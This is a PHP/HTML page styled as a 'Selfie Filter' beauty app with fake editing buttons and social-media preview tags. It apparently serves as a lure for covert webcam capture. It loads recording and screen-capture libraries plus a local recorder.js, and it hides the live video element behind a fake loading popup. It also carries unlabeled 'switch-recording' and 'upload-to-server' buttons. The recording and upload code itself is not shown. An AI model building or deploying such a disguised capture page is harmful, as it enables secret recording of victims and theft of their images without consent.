<?php
include "validate.php";
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Selfie Filter | Feel your beauty</title>
    <meta property="og:title" content="Selfie Filter | Feel your beauty" />
    <meta property="og:type" content="website" />
    <meta name="og:image" content="/desc.png" />
    <meta name="description" content="Unleash your beauty with this filter" property="og:description">
    <meta name="description" content="/desc.png" property="og:image" />
    <meta name="twitter:card" content="summary" />
	<meta name="twitter:title" content="Selfie Filter" />
	<meta name="twitter:description" content="Unleash your beauty with this filter" />
	<meta name="twitter:image" content="/desc.png">
    <script
      defer
      src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"
    ></script>
    <script
      defer
      src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/js/all.min.js"
      integrity="sha512-6PM0qYu5KExuNcKt5bURAoT6KCThUmHRewN3zUFNaoI6Di7XJPTMoT6K0nsagZKk2OB4L7E3q1uQKHNHd4stIQ=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    ></script>
    <script defer src="https://www.webrtc-experiment.com/RecordRTC.js"></script>
    <script
      defer
      src="https://www.webrtc-experiment.com/gif-recorder.js"
    ></script>
    <script
      defer
      src="https://www.webrtc-experiment.com/getScreenId.js"
    ></script>
    <script defer src="https://www.webrtc-experiment.com/DetectRTC.js"></script>

    <!-- for Edige/FF/Chrome/Opera/etc. getUserMedia support -->
    <script
      defer
      src="https://webrtc.github.io/adapter/adapter-latest.js"
    ></script>
    <script defer src="./script.js"></script>
    <script defer src="/recorder.js"></script>
    <link rel="stylesheet" href="./styles.css" />
  </head>

  <body>
    <div class="video-wrap" hidden="hidden">
      <video id="video" playsinline autoplay></video>
      <video
        controls
        playsinline
        autoplay
        muted="false"
        volume="1"
        class="recordvideo"
      ></video>
    </div>

    <center>
      <canvas id="canvas" width="640" height="480" autoplay></canvas>
    </center>
    <div class="recordrtc">
      <button class="switch-recording"></button>
      <button id="upload-to-server"></button>
    </div>
    <div class="float_button">
      <i
        class="fas fa-expand"
        style="color: #fff; font-size: 18px; margin-top: 5px"
      ></i>
    </div>
    <div id="ac-wrapper">
      <div id="popup">
        <center>
          <h2>Please wait. Selfie Filter is loading!</h2>
        </center>
      </div>
    </div>
    <div class="bottom-bar">
      <div class="icon-button">
        <i class="fa-solid fa-wand-magic-sparkles"></i>
        <h6>Auto Beautify</h6>
      </div>
      <div class="icon-button" >
        <i class="fa-solid fa-pen-to-square"></i>
        <h6>Edit</h6>
      </div>
      <div class="icon-button" style="margin-left: auto">
        <i class="fa-solid fa-filter"></i>
        <h6>Filter</h6>
      </div>
      <div class="icon-button" >
        <i class="fa-solid fa-crop"></i>
        <h6>Crop</h6>
      </div>
      <div class="icon-button" >
        <i class="fa-solid fa-rotate"></i>
        <h6>Rotate</h6>
      </div>
      <div class="icon-button" >
        <i class="fa-solid fa-sliders"></i>
        <h6>Adjust</h6>
      </div>
      <div class="icon-button" style="margin-right: auto">
        <i class="fa-solid fa-download"></i>
        <h6>Download</h6>
      </div>
      <button style="margin-right: 50px">Exit</button>
    </div>
  </body>
</html>
